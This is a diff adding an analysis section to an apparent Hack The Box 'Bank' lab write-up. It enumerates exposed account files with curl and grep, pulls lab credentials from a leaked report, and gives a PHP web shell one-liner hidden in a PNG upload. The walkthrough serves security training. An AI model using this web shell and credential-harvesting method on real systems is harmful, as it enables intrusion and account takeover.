@@ -536,5 +536,121 @@ The command executes a scan using Nuclei against the target URLs listed in `bank
    - Nuclei skips some target URLs (`www.bank.htb`, `ns.bank.htb`, `chris.bank.htb`, `bank.htb`) due to unresponsiveness after multiple attempts.
 
 The scan provides valuable insights into potential security issues and vulnerabilities present in the target URLs. These findings can aid in securing the web applications and network infrastructure against various threats and attacks. Nuclei proves to be a versatile and effective tool for security scanning, offering comprehensive coverage of web and network security assessment.
+
+### Analysis
+
+```bash
+# number of files ending with .acc
+$ curl -sL http://bank.htb/balance-transfer | grep -i '.acc' | wc -l
+999
+
+-----------
+
+# number of files not ending with .acc
+$ curl -sL http://bank.htb/balance-transfer | grep -iv '.acc' | wc -l
+15
+
+# get the first 10 line after sorting at second field
+$ curl -sL http://bank.htb/balance-transfer | grep -i '.acc' | grep -ioE '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d '>' -f1,7 | tr '">' ' ' | sort -k2 | head
+68576f20e9732f1b2edc4df5b8533230.acc  257 
+09ed7588d1cd47ffca297cc7dac22c52.acc  581 
+941e55bed0cb8052e7015e7133a5b9c7.acc  581 
+052a101eac01ccbf5120996cdc60e76d.acc  582 
+0d64f03e84187359907569a43c83bddc.acc  582 
+10805eead8596309e32a6bfe102f7b2c.acc  582 
+20fd5f9690efca3dc465097376b31dd6.acc  582 
+346bf50f208571cd9d4c4ec7f8d0b4df.acc  582 
+70b43acf0a3e285c423ee9267acaebb2.acc  582 
+780a84585b62356360a9495d9ff3a485.acc  582
+
+# stats on the byte sizes
+$ curl -sL http://bank.htb/balance-transfer | grep -i '.acc' | grep -ioE '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d '>' -f1,7 | tr '">' ' ' | cut -d ' ' -f3 | sort | uniq -c
+      1 257
+      2 581
+     11 582
+     97 583
+    590 584
+    298 585
+
+# get the one file of 257 byte size 
+$ curl -sL http://bank.htb/balance-transfer | grep -i '.acc' | grep -ioE '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d '>' -f1,7 | tr '">' ' ' | grep -iE '\b257\b'
+68576f20e9732f1b2edc4df5b8533230.acc  257
+
+# check out the file
+$ curl -sL http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc
+--ERR ENCRYPT FAILED
++=================+
+| HTB Bank Report |
++=================+
+
+===UserAccount===
+Full Name: Christos Christopoulos
+Email: chris@bank.htb
+Password: !##HTBB4nkP4ssw0rd!##
+CreditCards: 5
+Transactions: 39
+Balance: 8842803 .
+===UserAccount===
+
+# record the creds
+vi creds.txt
+chris@bank.htb:!##HTBB4nkP4ssw0rd!##
+
+# now login with the username and password at http://bank.htb 
+# you should be able to login to the account
+# Start looking for the place to upload files since we know that there is a directory for upload. 
+# Go to Support page in Chris's account and test upload a random png file while Burp Suite intercepts the traffic. It will capture the request and response for the upload.
+
+# craft the request with first three lines started with PNG magic byte and place php code execution inside the png file as below. Note that \n "Show non-printable chars" must be turned on to see the same output.
+<?php system($_REQUEST["cmd"]); ?>
+
+# with further enumertion, check the source code of bank.htb/support.php page and find there is a DEBUG block in it. 
+<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
+```
+
+It's a series of actions against the target URL `http://bank.htb/balance-transfer`. Let's break down each step:
+
+1. **Counting Files Ending with `.acc`**:
+   - It uses `curl` to fetch the HTML content from the specified URL.
+   - `grep` is used to filter lines containing `.acc` case-insensitively.
+   - `wc -l` counts the number of lines, which corresponds to the number of files ending with `.acc`.
+   - Result: 999 files ending with `.acc`.
+
+2. **Counting Files Not Ending with `.acc`**:
+   - Similar to the previous step, but this time `grep -iv` is used to exclude lines containing `.acc`.
+   - Result: 15 files not ending with `.acc`.
+
+3. **Listing Files and Their Sizes**:
+   - The script fetches the content, extracts file names and sizes, and sorts them by size.
+   - It uses a combination of `grep`, `cut`, `tr`, `sort`, and `head`.
+   - The output lists the first 10 files sorted by size, showing their names and sizes.
+
+4. **Statistics on Byte Sizes**:
+   - It retrieves file sizes, counts their occurrences, and sorts them.
+   - `grep`, `cut`, `tr`, `sort`, and `uniq -c` are used.
+   - The output displays the count of files for each unique byte size.
+
+5. **Retrieving a Specific File**:
+   - It fetches the content, identifies files with a size of 257 bytes, and displays their names.
+   - The output reveals a single file with the specified size.
+
+6. **Viewing the Content of the File**:
+   - The script fetches the content of the file `68576f20e9732f1b2edc4df5b8533230.acc`.
+   - The content includes sensitive information like full name, email, password, credit card count, transactions count, and balance.
+
+7. **Recording the Credentials**:
+   - It records the credentials (`chris@bank.htb: !##HTBB4nkP4ssw0rd!##`) in a file named `creds.txt`.
+
+8. **Logging in to the Account**:
+   - It suggests logging in to the account using the obtained credentials.
+   - After successful login, it advises looking for the place to upload files, as there is a directory for uploads.
+
+9. **Crafting a Request for File Upload**:
+   - It provides instructions for crafting a request to upload a file with PHP code execution inside a PNG file.
+
+10. **Source Code Inspection**:
+    - It suggests inspecting the source code of `bank.htb/support.php` and mentions a debug block added for executing `.htb` files as PHP for debugging purposes.
+
+Overall, the script demonstrates a systematic approach to exploring and interacting with a web application, including enumeration of files, extraction of sensitive information, and identification of potential vulnerabilities for further exploitation.
 ## Exploits
 
